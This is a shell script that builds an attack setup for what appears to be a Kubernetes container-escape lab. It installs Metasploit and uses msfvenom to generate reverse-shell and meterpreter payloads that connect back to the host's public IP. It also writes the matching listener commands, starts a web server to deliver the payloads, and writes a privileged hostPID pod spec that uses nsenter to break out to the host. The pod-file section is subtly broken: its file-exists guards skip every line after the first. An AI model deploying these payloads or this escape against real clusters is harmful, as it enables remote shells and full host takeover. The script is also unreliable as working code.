#!/bin/sh

# install all necessary tools
sudo apt update && sudo apt remove -y netcat-openbsd && sudo apt install -y netcat-traditional
sudo apt install -y ca-certificates curl gnupg lsb-release
sudo apt install -y nmap ruby nano
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > /tmp/msfinstall
sudo chmod 755 /tmp/msfinstall
sudo /tmp/msfinstall
sudo msfdb init

# create all metasploit stuff
PUBLIC_IP=$(curl -sf -H 'Metadata-Flavor:Google' http://metadata/computeMetadata/v1/instance/network-interfaces/0/access-configs/0/external-ip)
ROOT_DIR=/root/container-escape

sudo mkdir -p $ROOT_DIR

sudo [ ! -f $ROOT_DIR/met-container ] && sudo msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=$PUBLIC_IP LPORT=4242 -f elf > $ROOT_DIR/met-container

sudo [ ! -f $ROOT_DIR/met-host ] && sudo msfvenom -p linux/x86/shell/reverse_tcp LHOST=$PUBLIC_IP LPORT=4243 -f elf > $ROOT_DIR/met-host

sudo [ ! -f $ROOT_DIR/msfconsole1 ] && sudo echo "msfconsole -q -x 'use exploit/multi/handler;set payload linux/x86/meterpreter_reverse_tcp;set lhost 0.0.0.0; set lport 4242;run'" > $ROOT_DIR/msfconsole1

sudo [ ! -f $ROOT_DIR/msfconsole2 ] && sudo echo "msfconsole -q -x 'use exploit/multi/handler;set payload linux/x86/shell/reverse_tcp;set lhost 0.0.0.0; set lport 4243;run'" > $ROOT_DIR/msfconsole2

sudo [ ! -f $ROOT_DIR/start_ruby_webserver ] && echo "ruby -run -ehttpd . -p8001" > $ROOT_DIR/start_ruby_webserver

sudo chmod -R +x $ROOT_DIR

sudo [ ! -f $ROOT_DIR/pub-ip ] && echo $PUBLIC_IP > $ROOT_DIR/pub-ip

# create pod-esc file
sudo [ ! -f $ROOT_DIR/pod-esc ] && echo 'apiVersion: v1' > $ROOT_DIR/pod-esc
sudo [ ! -f $ROOT_DIR/pod-esc ] && echo 'kind: Pod' >> $ROOT_DIR/pod-esc
sudo [ ! -f $ROOT_DIR/pod-esc ] && echo 'metadata:' >> $ROOT_DIR/pod-esc
sudo [ ! -f $ROOT_DIR/pod-esc ] && echo '  name: priv-and-hostpid-exec-pod:' >> $ROOT_DIR/pod-esc
sudo [ ! -f $ROOT_DIR/pod-esc ] && echo '  labels:' >> $ROOT_DIR/pod-esc
sudo [ ! -f $ROOT_DIR/pod-esc ] && echo '    app: container-escape' >> $ROOT_DIR/pod-esc
sudo [ ! -f $ROOT_DIR/pod-esc ] && echo 'spec:' >> $ROOT_DIR/pod-esc
sudo [ ! -f $ROOT_DIR/pod-esc ] && echo '  hostPID: true' >> $ROOT_DIR/pod-esc
sudo [ ! -f $ROOT_DIR/pod-esc ] && echo '  containers:' >> $ROOT_DIR/pod-esc
sudo [ ! -f $ROOT_DIR/pod-esc ] && echo '  - name: priv-and-hostpid-pod' >> $ROOT_DIR/pod-esc
sudo [ ! -f $ROOT_DIR/pod-esc ] && echo '    image: ubuntu' >> $ROOT_DIR/pod-esc
sudo [ ! -f $ROOT_DIR/pod-esc ] && echo '    tty: true' >> $ROOT_DIR/pod-esc
sudo [ ! -f $ROOT_DIR/pod-esc ] && echo '    securityContext:' >> $ROOT_DIR/pod-esc
sudo [ ! -f $ROOT_DIR/pod-esc ] && echo '      privileged: true' >> $ROOT_DIR/pod-esc
sudo [ ! -f $ROOT_DIR/pod-esc ] && echo '    command: [ "nsenter", "--target", "1", "--mount", "--uts", "--ipc", "--net", "--pid", "--", "bash" ]' >> $ROOT_DIR/pod-esc